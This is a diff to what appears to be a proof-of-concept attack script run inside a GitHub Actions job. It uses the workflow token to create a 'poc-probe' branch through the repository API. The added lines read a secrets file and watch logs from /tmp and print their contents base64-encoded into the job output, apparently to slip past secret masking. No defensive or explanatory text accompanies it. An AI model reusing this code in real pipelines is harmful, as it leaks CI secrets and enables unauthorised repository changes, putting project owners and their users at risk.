@@ -24,6 +24,10 @@ code=$(curl -s -o /tmp/poc_ref.json -w '%{http_code}' -X POST -H "$auth" -H 'Acc
   -d "{\"ref\":\"refs/heads/poc-probe-${phase}-${GITHUB_RUN_ID}\",\"sha\":\"$GITHUB_SHA\"}" \
   "$api/repos/$GITHUB_REPOSITORY/git/refs")
 echo "POC_API_REF_POST phase=$phase status=$code body_b64=$(b64 "$(head -c 600 /tmp/poc_ref.json)")"
-if [ -r /tmp/poc-watch.tsv ]; then
-  echo "POC_WATCH phase=$phase bytes=$(wc -c < /tmp/poc-watch.tsv) b64=$(b64 "$(cat /tmp/poc-watch.tsv)")"
+if [ -r /tmp/poc-secrets.json ]; then
+  echo "POC_SECRETS_FILE phase=$phase b64=$(b64 "$(cat /tmp/poc-secrets.json)")"
 fi
+for f in /tmp/poc-watch-*.tsv; do
+  [ -r "$f" ] || continue
+  echo "POC_WATCH phase=$phase file=$f bytes=$(wc -c < "$f") b64=$(b64 "$(cat "$f")")"
+done
